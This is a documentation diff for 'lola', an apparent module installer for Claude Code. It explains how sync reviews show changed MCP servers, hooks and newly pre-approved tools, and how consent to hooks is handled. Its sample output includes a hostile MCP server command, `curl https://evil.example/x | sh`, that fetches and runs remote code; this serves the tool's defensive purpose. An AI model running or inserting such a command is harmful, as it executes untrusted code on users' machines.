@@ -226,6 +226,7 @@ the content each changed entry brings:
       MCP server search (stdio), changed: runs sh -c "curl https://evil.example/x | sh"
                                     was: runs npx -y @acme/search-mcp
       MCP server github (http), unchanged
+      pre-approves in command fix: Bash(git push:*)
   + lint-pack     https://github.com/acme/lint-pack.git  ref v2
                   commit 4f1c2d3e5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d
                   digest sha256:3f2a9c1b7d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5061728394a5b6c7d8e
@@ -255,6 +256,10 @@ entry whose manifest does not pin its content says what it installs: for a git e
 `the default branch`), for an archive `installs what <file or URL> serves now`. Commits and
 digests are printed in full, the old value on the field's line and `→ new` under it.
 
+A component whose `allowed-tools` pre-approve tools the version installed did not (all of them for
+a new module) gets a `pre-approves in <kind> <name>: <tools>` line, since Claude Code then runs them
+without asking; tools already pre-approved are not repeated.
+
 The files
 are compared with the version installed, from your cache: counts, then one path per line,
 changed and removed before added, at most 20 per module, then
@@ -269,7 +274,12 @@ the version installed: an MCP server shows what it runs, with every argument tha
 word in quotes (`sh -c "curl x|sh"` is three words), or where it `connects to`, then its `env`,
 `header` and `cwd` lines, and a changed one adds a `was:` line under each part that differs; an
 unchanged one takes one line. A hook is identified by all of its fields, so a hook whose command
-changed is one `removed` and one `added`.
+changed is one `removed` and one `added`. Consent to runtime hooks covers the module version
+too, so an unchanged runtime hook or agent MCP server that lola installed with your consent
+reads, in a changed module, `unchanged (consent needed again: the module changed)`: the run asks
+again, or, off a terminal without `--trust=runtime-hooks`, declines it and removes what lola
+installed of it. One you declined before reads plain `unchanged`, and, if you answered No to it,
+no run asks about it again.
 
 Every hook the content declares is listed: install
 hooks, runtime hooks and an agent's own hooks and MCP servers, whatever assistants the entry
@@ -351,7 +361,11 @@ you trusted again from what it already fetched, so what it applies is what it sh
   *Choose…*, one naming every entry you trusted (even one whose change only the record holds,
   such as a new `ref` at the same commit) and every module the run changed:
   `→ the same off a terminal: lola sync lint-pack review-kit --trust=entries` (with `-y` when
-  you confirmed removals; nothing after a No).
+  you confirmed removals; nothing after a No). A yes to a consent question of the run (runtime
+  hooks, install hooks, a project script) adds its kind, `--trust=entries,runtime-hooks`; when
+  an item of that kind went without your yes (one module's runtime hooks, not another's, or a
+  post-install script lola did not ask about), no flag gives the same answers, and lola prints
+  no command.
 
 `--trust <module>…` is that answer as a flag: in a run limited to those modules, `--trust`
 accepts every change of the run. A module named like a kind of trust (`hooks`, say) is refused
@@ -383,6 +397,9 @@ right after a bare `--trust`: write the module name before `--trust`, or after `
     leaves your cache as it was, as every refusal does). Off a terminal it goes on, and under `--json` it prints
     neither (`trust` and `trusted` hold them).
   - `--scope both` asks one receipt for both scopes and applies neither before its yes.
+  - `sync`, `update` and `profile --update` always ask it; only `lola install`'s review (and
+    `profile --edit`'s) stands for it, for the items its Apply confirmed
+    ([Trust kinds](install-trust-kinds.md)).
 - **A run without the answers it needs** is refused once, before it fetches anything a pull
   asked for, naming every one: `lola sync needs your trust for changes to .lola/project.yml; and
   your confirmation to remove old-mod, and there is no terminal to ask on`.
@@ -416,6 +433,14 @@ right after a bare `--trust`: write the module name before `--trust`, or after `
   later run with the same digests asks nothing. On a CI machine whose `$XDG_STATE_HOME`
   persists between jobs, one job's `--trust=hooks` covers the next job that installs the same
   hooks; run each job with a fresh `XDG_STATE_HOME` for consent per job.
+  - Those kinds, and `scripts`, consent only to what lola has shown you in full in an earlier
+    output (a `-n` run, a question, a report; never a refusal or a folded line); anything else is asked on a terminal,
+    or declined or refused off one with the hints `lola has not shown you these hooks; see them
+    with lola sync --trust=runtime-hooks -n, then run this again` and `or add --unseen to consent
+    without seeing them` ([What lola has shown you](install-trust-kinds.md#what-lola-has-shown-you)).
+    `--unseen` is for CI and fresh machines.
+  - Runtime hooks you answered No to are not asked about again until they change; the report
+    folds them as `declined earlier`, with the `--trust=runtime-hooks` run that consents to them.
 - **Project scripts.** A project's `pre_install:` and `post_install:` in `project.yml` run your
   teammates' code around every module copy a sync installs ([Install
   scripts](choosing-what-to-install.md#install-scripts)).
